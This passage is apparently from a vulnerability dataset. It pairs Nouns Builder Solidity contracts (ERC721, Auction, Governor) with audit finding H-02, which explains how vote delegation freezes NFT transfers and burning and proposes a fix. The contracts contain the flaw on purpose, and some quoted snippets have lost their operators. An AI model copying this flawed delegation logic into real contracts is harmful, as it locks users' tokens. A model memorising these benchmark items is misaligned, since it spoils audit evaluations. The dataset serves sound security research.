&&\n            ERC721TokenReceiver(_to).onERC721Received(msg.sender, _from, _tokenId, \"\") != ERC721TokenReceiver.onERC721Received.selector\n        ) revert INVALID_RECIPIENT();\n    }\n\n    /// @notice Safe transfers a token from sender to recipient with additional data\n    /// @param _from The sender address\n    /// @param _to The recipient address\n    /// @param _tokenId The ERC-721 token id\n    function safeTransferFrom(\n        address _from,\n        address _to,\n        uint256 _tokenId,\n        bytes calldata _data\n    ) external {\n        transferFrom(_from, _to, _tokenId);\n\n        if (\n            Address.isContract(_to) &&\n            ERC721TokenReceiver(_to).onERC721Received(msg.sender, _from, _tokenId, _data) != ERC721TokenReceiver.onERC721Received.selector\n        ) revert INVALID_RECIPIENT();\n    }\n\n    /// @dev Mints a token to a recipient\n    /// @param _to The recipient address\n    /// @param _tokenId The ERC-721 token id\n    function _mint(address _to, uint256 _tokenId) internal virtual {\n        if (_to == address(0)) revert ADDRESS_ZERO();\n\n        if (owners[_tokenId] != address(0)) revert ALREADY_MINTED();\n\n        _beforeTokenTransfer(address(0), _to, _tokenId);\n\n        unchecked {\n            ++balances[_to];\n        }\n\n        owners[_tokenId] = _to;\n\n        emit Transfer(address(0), _to, _tokenId);\n\n        _afterTokenTransfer(address(0), _to, _tokenId);\n    }\n\n    /// @dev Burns a token to a recipient\n    /// @param _tokenId The ERC-721 token id\n    function _burn(uint256 _tokenId) internal virtual {\n        address owner = owners[_tokenId];\n\n        if (owner == address(0)) revert NOT_MINTED();\n\n        _beforeTokenTransfer(owner, address(0), _tokenId);\n\n        unchecked {\n            --balances[owner];\n        }\n\n        delete owners[_tokenId];\n\n        delete tokenApprovals[_tokenId];\n\n        emit Transfer(owner, address(0), _tokenId);\n\n        _afterTokenTransfer(owner, address(0), _tokenId);\n    }\n\n    /// @dev Hook called before a token transfer\n    /// @param _from The sender address\n    /// @param _to The recipient address\n    /// @param _tokenId The ERC-721 token id\n    function _beforeTokenTransfer(\n        address _from,\n        address _to,\n        uint256 _tokenId\n    ) internal virtual {}\n\n    /// @dev Hook called after a token transfer\n    /// @param _from The sender address\n    /// @param _to The recipient address\n    /// @param _tokenId The ERC-721 token id\n    function _afterTokenTransfer(\n        address _from,\n        address _to,\n        uint256 _tokenId\n    ) internal virtual {}\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.15;\n\nimport { UUPS } from \"../lib/proxy/UUPS.sol\";\nimport { Ownable } from \"../lib/utils/Ownable.sol\";\nimport { ReentrancyGuard } from \"../lib/utils/ReentrancyGuard.sol\";\nimport { Pausable } from \"../lib/utils/Pausable.sol\";\nimport { SafeCast } from \"../lib/utils/SafeCast.sol\";\n\nimport { AuctionStorageV1 } from \"./storage/AuctionStorageV1.sol\";\nimport { Token } from \"../token/Token.sol\";\nimport { IManager } from \"../manager/IManager.sol\";\nimport { IAuction } from \"./IAuction.sol\";\nimport { IWETH } from \"../lib/interfaces/IWETH.sol\";\n\n/// @title Auction\n/// @author Rohan Kulkarni\n/// @notice A DAO's auction house\n/// Modified from:\n/// - NounsAuctionHouse.sol commit 2cbe6c7 - licensed under the BSD-3-Clause license.\n/// - Zora V3 ReserveAuctionCoreEth module commit 795aeca - licensed under the GPL-3.0 license.\ncontract Auction is IAuction, UUPS, Ownable, ReentrancyGuard, Pausable, AuctionStorageV1 {\n    ///                                                          ///\n    ///                          IMMUTABLES                      ///\n    ///                                                          ///\n\n    /// @notice The address of WETH\n    address private immutable WETH;\n\n    /// @notice The contract upgrade manager\n    IManager private immutable manager;\n\n    ///                                                          ///\n    ///                          CONSTRUCTOR                     ///\n    ///                                                          ///\n\n    /// @param _manager The contract upgrade manager address\n    /// @param _weth The address of WETH\n    constructor(address _manager, address _weth) payable initializer {\n        manager = IManager(_manager);\n        WETH = _weth;\n    }\n\n    ///                                                          ///\n    ///                          INITIALIZER                     ///\n    ///                                                          ///\n\n    /// @notice Initializes a DAO's auction contract\n    /// @param _token The ERC-721 token address\n    /// @param _founder The founder responsible for starting the first auction\n    /// @param _treasury The treasury address where ETH will be sent\n    /// @param _duration The duration of each auction\n    /// @param _reservePrice The reserve price of each auction\n    function initialize(\n        address _token,\n        address _founder,\n        address _treasury,\n        uint256 _duration,\n        uint256 _reservePrice\n    ) external initializer {\n        // Ensure the caller is the contract manager\n        if (msg.sender != address(manager)) revert ONLY_MANAGER();\n\n        // Initialize the reentrancy guard\n        __ReentrancyGuard_init();\n\n        // Grant initial ownership to a founder\n        __Ownable_init(_founder);\n\n        // Pause the contract until the first auction\n        __Pausable_init(true);\n\n        // Store DAO's ERC-721 token\n        token = Token(_token);\n\n        // Store the auction house settings\n        settings.duration = SafeCast.toUint40(_duration);\n        settings.reservePrice = _reservePrice;\n        settings.treasury = _treasury;\n        settings.timeBuffer = 5 minutes;\n        settings.minBidIncrement = 10;\n    }\n\n    ///                                                          ///\n    ///                          CREATE BID                      ///\n    ///                                                          ///\n\n    /// @notice Creates a bid for the current token\n    /// @param _tokenId The ERC-721 token id\n    function createBid(uint256 _tokenId) external payable nonReentrant {\n        // Get a copy of the current auction\n        Auction memory _auction = auction;\n\n        // Ensure the bid is for the current token\n        if (_auction.tokenId != _tokenId) revert INVALID_TOKEN_ID();\n\n        // Ensure the auction is still active\n        if (block.timestamp >= _auction.endTime) revert AUCTION_OVER();\n\n        // Cache the address of the highest bidder\n        address highestBidder = _auction.highestBidder;\n\n        // If this is the first bid:\n        if (highestBidder == address(0)) {\n            // Ensure the bid meets the reserve price\n            if (msg.value < settings.reservePrice) revert RESERVE_PRICE_NOT_MET();\n\n            // Else this is a subsequent bid:\n        } else {\n            // Cache the highest bid\n            uint256 highestBid = _auction.highestBid;\n\n            // Used to store the minimum bid required\n            uint256 minBid;\n\n            // Cannot realistically overflow\n            unchecked {\n                // Compute the minimum bid\n                minBid = highestBid + ((highestBid * settings.minBidIncrement) / 100);\n            }\n\n            // Ensure the incoming bid meets the minimum\n            if (msg.value < minBid) revert MINIMUM_BID_NOT_MET();\n\n            // Refund the previous bidder\n            _handleOutgoingTransfer(highestBidder, highestBid);\n        }\n\n        // Store the new highest bid\n        auction.highestBid = msg.value;\n\n        // Store the new highest bidder\n        auction.highestBidder = msg.sender;\n\n        // Used to store if the auction will be extended\n        bool extend;\n\n        // Cannot underflow as `_auction.endTime` is ensured to be greater than the current time above\n        unchecked {\n            // Compute whether the time remaining is less than the buffer\n            extend = (_auction.endTime - block.timestamp) < settings.timeBuffer;\n        }\n\n        // If the time remaining is within the buffer:\n        if (extend) {\n            // Cannot realistically overflow\n            unchecked {\n                // Extend the auction by the time buffer\n                auction.endTime = uint40(block.timestamp + settings.timeBuffer);\n            }\n        }\n\n        emit AuctionBid(_tokenId, msg.sender, msg.value, extend, auction.endTime);\n    }\n\n    ///                                                          ///\n    ///                    SETTLE & CREATE AUCTION               ///\n    ///                                                          ///\n\n    /// @notice Settles the current auction and creates the next one\n    function settleCurrentAndCreateNewAuction() external nonReentrant whenNotPaused {\n        _settleAuction();\n        _createAuction();\n    }\n\n    /// @dev Settles the current auction\n    function _settleAuction() private {\n        // Get a copy of the current auction\n        Auction memory _auction = auction;\n\n        // Ensure the auction wasn't already settled\n        if (auction.settled) revert AUCTION_SETTLED();\n\n        // Ensure the auction had started\n        if (_auction.startTime == 0) revert AUCTION_NOT_STARTED();\n\n        // Ensure the auction is over\n        if (block.timestamp < _auction.endTime) revert AUCTION_ACTIVE();\n\n        // Mark the auction as settled\n        auction.settled = true;\n\n        // If a bid was placed:\n        if (_auction.highestBidder != address(0)) {\n            // Cache the amount of the highest bid\n            uint256 highestBid = _auction.highestBid;\n\n            // If the highest bid included ETH: Transfer it to the DAO treasury\n            if (highestBid != 0) _handleOutgoingTransfer(settings.treasury, highestBid);\n\n            // Transfer the token to the highest bidder\n            token.transferFrom(address(this), _auction.highestBidder, _auction.tokenId);\n\n            // Else no bid was placed:\n        } else {\n            // Burn the token\n            token.burn(_auction.tokenId);\n        }\n\n        emit AuctionSettled(_auction.tokenId, _auction.highestBidder, _auction.highestBid);\n    }\n\n    /// @dev Creates an auction for the next token\n    function _createAuction() private {\n        // Get the next token available for bidding\n        try token.mint() returns (uint256 tokenId) {\n            // Store the token id\n            auction.tokenId = tokenId;\n\n            // Cache the current timestamp\n            uint256 startTime = block.timestamp;\n\n            // Used to store the auction end time\n            uint256 endTime;\n\n            // Cannot realistically overflow\n            unchecked {\n                // Compute the auction end time\n                endTime = startTime + settings.duration;\n            }\n\n            // Store the auction start and end time\n            auction.startTime = uint40(startTime);\n            auction.endTime = uint40(endTime);\n\n            // Reset data from the previous auction\n            auction.highestBid = 0;\n            auction.highestBidder = address(0);\n            auction.settled = false;\n\n            emit AuctionCreated(tokenId, startTime, endTime);\n\n            // Pause the contract if token minting failed\n        } catch Error(string memory) {\n            _pause();\n        }\n    }\n\n    ///                                                          ///\n    ///                             PAUSE                        ///\n    ///                                                          ///\n\n    /// @notice Unpauses the auction house\n    function unpause() external onlyOwner {\n        _unpause();\n\n        // If this is the first auction:\n        if (auction.tokenId == 0) {\n            // Transfer ownership of the contract to the DAO\n            transferOwnership(settings.treasury);\n\n            // Start the first auction\n            _createAuction();\n        }\n        // Else if the contract was paused and the previous auction was settled:\n        else if (auction.settled) {\n            // Start the next auction\n            _createAuction();\n        }\n    }\n\n    /// @notice Pauses the auction house\n    function pause() external onlyOwner {\n        _pause();\n    }\n\n    /// @notice Settles the latest auction when the contract is paused\n    function settleAuction() external nonReentrant whenPaused {\n        _settleAuction();\n    }\n\n    ///                                                          ///\n    ///                       AUCTION SETTINGS                   ///\n    ///                                                          ///\n\n    /// @notice The DAO treasury\n    function treasury() external view returns (address) {\n        return settings.treasury;\n    }\n\n    /// @notice The time duration of each auction\n    function duration() external view returns (uint256) {\n        return settings.duration;\n    }\n\n    /// @notice The reserve price of each auction\n    function reservePrice() external view returns (uint256) {\n        return settings.reservePrice;\n    }\n\n    /// @notice The minimum amount of time to place a bid during an active auction\n    function timeBuffer() external view returns (uint256) {\n        return settings.timeBuffer;\n    }\n\n    /// @notice The minimum percentage an incoming bid must raise the highest bid\n    function minBidIncrement() external view returns (uint256) {\n        return settings.minBidIncrement;\n    }\n\n    ///                                                          ///\n    ///                       UPDATE SETTINGS                    ///\n    ///                                                          ///\n\n    /// @notice Updates the time duration of each auction\n    /// @param _duration The new time duration\n    function setDuration(uint256 _duration) external onlyOwner {\n        settings.duration = SafeCast.toUint40(_duration);\n\n        emit DurationUpdated(_duration);\n    }\n\n    /// @notice Updates the reserve price of each auction\n    /// @param _reservePrice The new reserve price\n    function setReservePrice(uint256 _reservePrice) external onlyOwner {\n        settings.reservePrice = _reservePrice;\n\n        emit ReservePriceUpdated(_reservePrice);\n    }\n\n    /// @notice Updates the time buffer of each auction\n    /// @param _timeBuffer The new time buffer\n    function setTimeBuffer(uint256 _timeBuffer) external onlyOwner {\n        settings.timeBuffer = SafeCast.toUint40(_timeBuffer);\n\n        emit TimeBufferUpdated(_timeBuffer);\n    }\n\n    /// @notice Updates the minimum bid increment of each subsequent bid\n    /// @param _percentage The new percentage\n    function setMinimumBidIncrement(uint256 _percentage) external onlyOwner {\n        settings.minBidIncrement = SafeCast.toUint8(_percentage);\n\n        emit MinBidIncrementPercentageUpdated(_percentage);\n    }\n\n    ///                                                          ///\n    ///                        TRANSFER UTIL                     ///\n    ///                                                          ///\n\n    /// @notice Transfer ETH/WETH from the contract\n    /// @param _to The recipient address\n    /// @param _amount The amount transferring\n    function _handleOutgoingTransfer(address _to, uint256 _amount) private {\n        // Ensure the contract has enough ETH to transfer\n        if (address(this).balance < _amount) revert INSOLVENT();\n\n        // Used to store if the transfer succeeded\n        bool success;\n\n        assembly {\n            // Transfer ETH to the recipient\n            // Limit the call to 50,000 gas\n            success := call(50000, _to, _amount, 0, 0, 0, 0)\n        }\n\n        // If the transfer failed:\n        if (!success) {\n            // Wrap as WETH\n            IWETH(WETH).deposit{ value: _amount }();\n\n            // Transfer WETH instead\n            IWETH(WETH).transfer(_to, _amount);\n        }\n    }\n\n    ///                                                          ///\n    ///                        AUCTION UPGRADE                   ///\n    ///                                                          ///\n\n    /// @notice Ensures the caller is authorized to upgrade the contract and the new implementation is valid\n    /// @dev This function is called in `upgradeTo` & `upgradeToAndCall`\n    /// @param _newImpl The new implementation address\n    function _authorizeUpgrade(address _newImpl) internal view override onlyOwner {\n        // Ensure the new implementation is registered by the Builder DAO\n        if (!manager.isRegisteredUpgrade(_getImplementation(), _newImpl)) revert INVALID_UPGRADE(_newImpl);\n    }\n}\n\n\n",
        "CodeNames": [
            "ERC721Votes.sol",
            "ERC721.sol",
            "Auction.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-02",
                "Location": [
                    "//solidity\n    function _delegate(address _from, address _to) internal {\n        // Get the previous delegate\n        address prevDelegate = delegation[_from];\n\n        // Store the new delegate\n        delegation[_from] = _to;\n\n        emit DelegateChanged(_from, prevDelegate, _to);\n\n        // Transfer voting weight from the previous delegate to the new delegate\n        _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));\n    }\n",
                    "//solidity\n    function _moveDelegateVotes(\n        address _from,\n        address _to,\n        uint256 _amount\n    ) internal {\n        unchecked {\n            // If voting weight is being transferred:\n            if (_from != _to && _amount  0) {\n                // If this isn't a token mint:\n                if (_from != address(0)) {\n                    // Get the sender's number of checkpoints\n                    uint256 nCheckpoints = numCheckpoints[_from]++;\n\n                    // Used to store the sender's previous voting weight\n                    uint256 prevTotalVotes;\n\n                    // If this isn't the sender's first checkpoint: Get their previous voting weight\n                    if (nCheckpoints != 0) prevTotalVotes = checkpoints[_from][nCheckpoints 1].votes;\n\n                    // Update their voting weight\n                    _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes _amount);\n                }\n",
                    "//solidity\n    function _afterTokenTransfer(\n        address _from,\n        address _to,\n        uint256 _tokenId\n    ) internal override {\n        // Transfer 1 vote from the sender to the recipient\n        _moveDelegateVotes(_from, _to, 1);\n"
                ],
                "Type": " ERC721Votes's delegation disables NFT transfers and burning",
                "Description": "\nIf Alice the NFT owner first delegates her votes to herself, second delegates to anyone else with delegate() or delegateBySig() then all her NFT ids will become stuck: their transfers and burning will be disabled.\n\nThe issue is _afterTokenTransfer() callback running the _moveDelegateVotes() with an owner instead of her delegate. As Alice's votes in the checkpoint is zero after she delegated them, the subtraction _moveDelegateVotes() tries to perform during the move of the votes will be reverted.\n\nAs ERC721Votes is parent to Token and delegate is a kind of common and frequent operation, the impact is governance token moves being frozen in a variety of use cases, which interferes with governance voting process and can be critical for the project.\n\n\nSuppose Alice delegated all her votes to herself and then decided to delegate them to someone else with either delegate() or delegateBySig() calling _delegate():\n\n<https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L179-L190\n\nsolidity\n    function _delegate(address _from, address _to) internal {\n        // Get the previous delegate\n        address prevDelegate = delegation[_from];\n\n        // Store the new delegate\n        delegation[_from] = _to;\n\n        emit DelegateChanged(_from, prevDelegate, _to);\n\n        // Transfer voting weight from the previous delegate to the new delegate\n        _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));\n    }\n\n\n_moveDelegateVotes() will set her votes to 0 as _from == Alice and prevTotalVotes = _amount = balanceOf(Alice) (as _afterTokenTransfer() incremented Alice's vote balance on each mint to her):\n\n<https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L196-L217\n\nsolidity\n    function _moveDelegateVotes(\n        address _from,\n        address _to,\n        uint256 _amount\n    ) internal {\n        unchecked {\n            // If voting weight is being transferred:\n            if (_from != _to && _amount  0) {\n                // If this isn't a token mint:\n                if (_from != address(0)) {\n                    // Get the sender's number of checkpoints\n                    uint256 nCheckpoints = numCheckpoints[_from]++;\n\n                    // Used to store the sender's previous voting weight\n                    uint256 prevTotalVotes;\n\n                    // If this isn't the sender's first checkpoint: Get their previous voting weight\n                    if (nCheckpoints != 0) prevTotalVotes = checkpoints[_from][nCheckpoints 1].votes;\n\n                    // Update their voting weight\n                    _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes _amount);\n                }\n\n\nAfter that her votes in the checkpoint become zero. She will not be able to transfer the NFT as _afterTokenTransfer will revert on _moveDelegateVotes's attempt to move 1 vote from Alice to _to, while checkpoints[Alice][nCheckpoints 1].votes is 0:\n\n<https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L262-L268\n\nsolidity\n    function _afterTokenTransfer(\n        address _from,\n        address _to,\n        uint256 _tokenId\n    ) internal override {\n        // Transfer 1 vote from the sender to the recipient\n        _moveDelegateVotes(_from, _to, 1);\n\n\n",
                "Repair": "\nThe root issue is _afterTokenTransfer() dealing with Alice instead of Alice's delegate.\n\nConsider including delegates() call as a fix:\n\n<https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L262-L268\n\nsolidity\n    function _afterTokenTransfer(\n        address _from,\n        address _to,\n        uint256 _tokenId\n    ) internal override {\n        // Transfer 1 vote from the sender to the recipient\n      _moveDelegateVotes(_from, _to, 1);\n+       _moveDelegateVotes(delegates(_from), delegates(_to), 1);\n\n\nAs delegates(address(0)) == address(0) the burning/minting flow will persist:\n\n<https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L124-L129\n\nsolidity\n    /// @notice The delegate for an account\n    /// @param _account The account address\n    function delegates(address _account) external view returns (address) {\n        address current = delegation[_account];\n        return current == address(0) ? _account : current;\n    }\n\n\ntbtstl (Nouns Builder) confirmed(https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/373)\n\nAlex the Entreprenerd (judge) commented(https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/373#issuecomment-1258703067):\n  The Warden has shown how, due to the overlapping system handling delegation and balances, it is possible for a user to brick their own transferability of their tokens.\n \n This POC shows that any delegation will cause the issues as when dealing with a transfer, their currently zero-vote-balance will further be deducted instead of the delegated votes they have.\n \n Because the finding shows a broken invariant, in that any delegation will brick transfers, as the invariants offered by ERC721Votes have been broken; I believe High Severity to be appropriate.\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.15;\n\nimport { UUPS } from \"../../lib/proxy/UUPS.sol\";\nimport { Ownable } from \"../../lib/utils/Ownable.sol\";\nimport { EIP712 } from \"../../lib/utils/EIP712.sol\";\nimport { SafeCast } from \"../../lib/utils/SafeCast.sol\";\n\nimport { GovernorStorageV1 } from \"./storage/GovernorStorageV1.sol\";\nimport { Token } from \"../../token/Token.sol\";\nimport { Treasury } from \"../treasury/Treasury.sol\";\nimport { IManager } from \"../../manager/IManager.sol\";\nimport { IGovernor } from \"./IGovernor.sol\";\n\n/// @title Governor\n/// @author Rohan Kulkarni\n/// @notice A DAO's proposal manager and transaction scheduler\n/// Modified from:\n/// - OpenZeppelin Contracts v4.7.3 (governance/extensions/GovernorTimelockControl.sol)\n/// - NounsDAOLogicV1.sol commit 2cbe6c7 - licensed under the BSD-3-Clause license.\ncontract Governor is IGovernor, UUPS, Ownable, EIP712, GovernorStorageV1 {\n    ///                                                          ///\n    ///                         CONSTANTS                        ///\n    ///                                                          ///\n\n    /// @notice The EIP-712 typehash to vote with a signature\n    bytes32 public constant VOTE_TYPEHASH = keccak256(\"Vote(address voter,uint256 proposalId,uint256 support,uint256 nonce,uint256 deadline)\");\n\n    ///                                                          ///\n    ///                         IMMUTABLES                       ///\n    ///                                                          ///\n\n    /// @notice The contract upgrade manager\n    IManager private immutable manager;\n\n    ///                                                          ///\n    ///                         CONSTRUCTOR                      ///\n    ///                                                          ///\n\n    /// @param _manager The contract upgrade manager address\n    constructor(address _manager) payable initializer {\n        manager = IManager(_manager);\n    }\n\n    ///                                                          ///\n    ///                         INITIALIZER                      ///\n    ///                                                          ///\n\n    /// @notice Initializes a DAO's governor\n    /// @param _treasury The DAO's treasury address\n    /// @param _token The DAO's governance token address\n    /// @param _vetoer The address eligible to veto proposals\n    /// @param _votingDelay The voting delay\n    /// @param _votingPeriod The voting period\n    /// @param _proposalThresholdBps The proposal threshold basis points\n    /// @param _quorumThresholdBps The quorum threshold basis points\n    function initialize(\n        address _treasury,\n        address _token,\n        address _vetoer,\n        uint256 _votingDelay,\n        uint256 _votingPeriod,\n        uint256 _proposalThresholdBps,\n        uint256 _quorumThresholdBps\n    ) external initializer {\n        // Ensure the caller is the contract manager\n        if (msg.sender != address(manager)) revert ONLY_MANAGER();\n\n        // Ensure non-zero addresses are provided\n        if (_treasury == address(0)) revert ADDRESS_ZERO();\n        if (_token == address(0)) revert ADDRESS_ZERO();\n\n        // Store the governor settings\n        settings.treasury = Treasury(payable(_treasury));\n        settings.token = Token(_token);\n        settings.vetoer = _vetoer;\n        settings.votingDelay = SafeCast.toUint48(_votingDelay);\n        settings.votingPeriod = SafeCast.toUint48(_votingPeriod);\n        settings.proposalThresholdBps = SafeCast.toUint16(_proposalThresholdBps);\n        settings.quorumThresholdBps = SafeCast.toUint16(_quorumThresholdBps);\n\n        // Initialize EIP-712 support\n        __EIP712_init(string.concat(settings.token.symbol(), \" GOV\"), \"1\");\n\n        // Grant ownership to the treasury\n        __Ownable_init(_treasury);\n    }\n\n    ///                                                          ///\n    ///                         HASH PROPOSAL                    ///\n    ///                                                          ///\n\n    /// @notice Hashes a proposal's details into a proposal id\n    /// @param _targets The target addresses to call\n    /// @param _values The ETH values of each call\n    /// @param _calldatas The calldata of each call\n    /// @param _descriptionHash The hash of the description\n    function hashProposal(\n        address[] memory _targets,\n        uint256[] memory _values,\n        bytes[] memory _calldatas,\n        bytes32 _descriptionHash\n    ) public pure returns (bytes32) {\n        return keccak256(abi.encode(_targets, _values, _calldatas, _descriptionHash));\n    }\n\n    ///                                                          ///\n    ///                        CREATE PROPOSAL                   ///\n    ///                                                          ///\n\n    /// @notice Creates a proposal\n    /// @param _targets The target addresses to call\n    /// @param _values The ETH values of each call\n    /// @param _calldatas The calldata of each call\n    /// @param _description The proposal description\n    function propose(\n        address[] memory _targets,\n        uint256[] memory _values,\n        bytes[] memory _calldatas,\n        string memory _description\n    ) external returns (bytes32) {\n        // Get the current proposal threshold\n        uint256 currentProposalThreshold = proposalThreshold();\n\n        // Cannot realistically underflow and `getVotes` would revert\n        unchecked {\n            // Ensure the caller's voting weight is greater than or equal to the threshold\n            if (getVotes(msg.sender, block.timestamp - 1) < proposalThreshold()) revert BELOW_PROPOSAL_THRESHOLD();\n        }\n\n        // Cache the number of targets\n        uint256 numTargets = _targets.length;\n\n        // Ensure at least one target exists\n        if (numTargets == 0) revert PROPOSAL_TARGET_MISSING();\n\n        // Ensure the number of targets matches the number of values and calldata\n        if (numTargets != _values.length) revert PROPOSAL_LENGTH_MISMATCH();\n        if (numTargets != _calldatas.length) revert PROPOSAL_LENGTH_MISMATCH();\n\n        // Compute the description hash\n        bytes32 descriptionHash = keccak256(bytes(_description));\n\n        // Compute the proposal id\n        bytes32 proposalId = hashProposal(_targets, _values, _calldatas, descriptionHash);\n\n        // Get the pointer to store the proposal\n        Proposal storage proposal = proposals[proposalId];\n\n        // Ensure the proposal doesn't already exist\n        if (proposal.voteStart != 0) revert PROPOSAL_EXISTS(proposalId);\n\n        // Used to store the snapshot and deadline\n        uint256 snapshot;\n        uint256 deadline;\n\n        // Cannot realistically overflow\n        unchecked {\n            // Compute the snapshot and deadline\n            snapshot = block.timestamp + settings.votingDelay;\n            deadline = snapshot + settings.votingPeriod;\n        }\n\n        // Store the proposal data\n        proposal.voteStart = uint32(snapshot);\n        proposal.voteEnd = uint32(deadline);\n        proposal.proposalThreshold = uint32(currentProposalThreshold);\n        proposal.quorumVotes = uint32(quorum());\n        proposal.proposer = msg.sender;\n        proposal.timeCreated = uint32(block.timestamp);\n\n        emit ProposalCreated(proposalId, _targets, _values, _calldatas, _description, descriptionHash, proposal);\n\n        return proposalId;\n    }\n\n    ///                                                          ///\n    ///                          CAST VOTE                       ///\n    ///                                                          ///\n\n    /// @notice Casts a vote\n    /// @param _proposalId The proposal id\n    /// @param _support The support value (0 = Against, 1 = For, 2 = Abstain)\n    function castVote(bytes32 _proposalId, uint256 _support) external returns (uint256) {\n        return _castVote(_proposalId, msg.sender, _support, \"\");\n    }\n\n    /// @notice Casts a vote with a reason\n    /// @param _proposalId The proposal id\n    /// @param _support The support value (0 = Against, 1 = For, 2 = Abstain)\n    /// @param _reason The vote reason\n    function castVoteWithReason(\n        bytes32 _proposalId,\n        uint256 _support,\n        string memory _reason\n    ) external returns (uint256) {\n        return _castVote(_proposalId, msg.sender, _support, _reason);\n    }\n\n    /// @notice Casts a signed vote\n    /// @param _voter The voter address\n    /// @param _proposalId The proposal id\n    /// @param _support The support value (0 = Against, 1 = For, 2 = Abstain)\n    /// @param _deadline The signature deadline\n    /// @param _v The 129th byte and chain id of the signature\n    /// @param _r The first 64 bytes of the signature\n    /// @param _s Bytes 64-128 of the signature\n    function castVoteBySig(\n        address _voter,\n        bytes32 _proposalId,\n        uint256 _support,\n        uint256 _deadline,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) external returns (uint256) {\n        // Ensure the deadline has not passed\n        if (block.timestamp > _deadline) revert EXPIRED_SIGNATURE();\n\n        // Used to store the signed digest\n        bytes32 digest;\n\n        // Cannot realistically overflow\n        unchecked {\n            // Compute the message\n            digest = keccak256(\n                abi.encodePacked(\n                    \"\\x19\\x01\",\n                    DOMAIN_SEPARATOR(),\n                    keccak256(abi.encode(VOTE_TYPEHASH, _voter, _proposalId, _support, nonces[_voter]++, _deadline))\n                )\n            );\n        }\n\n        // Recover the message signer\n        address recoveredAddress = ecrecover(digest, _v, _r, _s);\n\n        // Ensure the recovered signer is the given voter\n        if (recoveredAddress == address(0) || recoveredAddress != _voter) revert INVALID_SIGNATURE();\n\n        return _castVote(_proposalId, _voter, _support, \"\");\n    }\n\n    /// @dev Stores a vote\n    /// @param _proposalId The proposal id\n    /// @param _voter The voter address\n    /// @param _support The vote choice\n    function _castVote(\n        bytes32 _proposalId,\n        address _voter,\n        uint256 _support,\n        string memory _reason\n    ) internal returns (uint256) {\n        // Ensure voting is active\n        if (state(_proposalId) != ProposalState.Active) revert VOTING_NOT_STARTED();\n\n        // Ensure the voter hasn't already voted\n        if (hasVoted[_proposalId][_voter]) revert ALREADY_VOTED();\n\n        // Ensure the vote is valid\n        if (_support > 2) revert INVALID_VOTE();\n\n        // Record the voter as having voted\n        hasVoted[_proposalId][_voter] = true;\n\n        // Get the pointer to the proposal\n        Proposal storage proposal = proposals[_proposalId];\n\n        // Used to store the voter's weight\n        uint256 weight;\n\n        // Cannot realistically underflow and `getVotes` would revert\n        unchecked {\n            // Get the voter's weight at the time the proposal was created\n            weight = getVotes(_voter, proposal.timeCreated);\n\n            // If the vote is against:\n            if (_support == 0) {\n                // Update the total number of votes against\n                proposal.againstVotes += uint32(weight);\n\n                // Else if the vote is for:\n            } else if (_support == 1) {\n                // Update the total number of votes for\n                proposal.forVotes += uint32(weight);\n\n                // Else if the vote is to abstain:\n            } else if (_support == 2) {\n                // Update the total number of votes abstaining\n                proposal.abstainVotes += uint32(weight);\n            }\n        }\n\n        emit VoteCast(_voter, _proposalId, _support, weight, _reason);\n\n        return weight;\n    }\n\n    ///                                                          ///\n    ///                        QUEUE PROPOSAL                    ///\n    ///                                                          ///\n\n    /// @notice Queues a proposal\n    /// @param _proposalId The proposal id\n    function queue(bytes32 _proposalId) external returns (uint256 eta) {\n        // Ensure the proposal has succeeded\n        if (state(_proposalId) != ProposalState.Succeeded) revert PROPOSAL_UNSUCCESSFUL();\n\n        // Schedule the proposal for execution\n        eta = settings.treasury.queue(_proposalId);\n\n        emit ProposalQueued(_proposalId, eta);\n    }\n\n    ///                                                          ///\n    ///                       EXECUTE PROPOSAL                   ///\n    ///                                                          ///\n\n    /// @notice Executes a proposal\n    /// @param _targets The target addresses to call\n    /// @param _values The ETH values of each call\n    /// @param _calldatas The calldata of each call\n    /// @param _descriptionHash The hash of the description\n    function execute(\n        address[] calldata _targets,\n        uint256[] calldata _values,\n        bytes[] calldata _calldatas,\n        bytes32 _descriptionHash\n    ) external payable returns (bytes32) {\n        // Get the proposal id\n        bytes32 proposalId = hashProposal(_targets, _values, _calldatas, _descriptionHash);\n\n        // Ensure the proposal is queued\n        if (state(proposalId) != ProposalState.Queued) revert PROPOSAL_NOT_QUEUED(proposalId);\n\n        // Mark the proposal as executed\n        proposals[proposalId].executed = true;\n\n        // Execute the proposal\n        settings.treasury.execute{ value: msg.value }(_targets, _values, _calldatas, _descriptionHash);\n\n        emit ProposalExecuted(proposalId);\n\n        return proposalId;\n    }\n\n    ///                                                          ///\n    ///                        CANCEL PROPOSAL                   ///\n    ///                                                          ///\n\n    /// @notice Cancels a proposal\n    /// @param _proposalId The proposal id\n    function cancel(bytes32 _proposalId) external {\n        // Ensure the proposal hasn't been executed\n        if (state(_proposalId) == ProposalState.Executed) revert PROPOSAL_ALREADY_EXECUTED();\n\n        // Get a copy of the proposal\n        Proposal memory proposal = proposals[_proposalId];\n\n        // Cannot realistically underflow and `getVotes` would revert\n        unchecked {\n            // Ensure the caller is the proposer or the proposer's voting weight has dropped below the proposal threshold\n            if (msg.sender != proposal.proposer && getVotes(proposal.proposer, block.timestamp - 1) > proposal.proposalThreshold)\n                revert INVALID_CANCEL();\n        }\n\n        // Update the proposal as canceled\n        proposals[_proposalId].canceled = true;\n\n        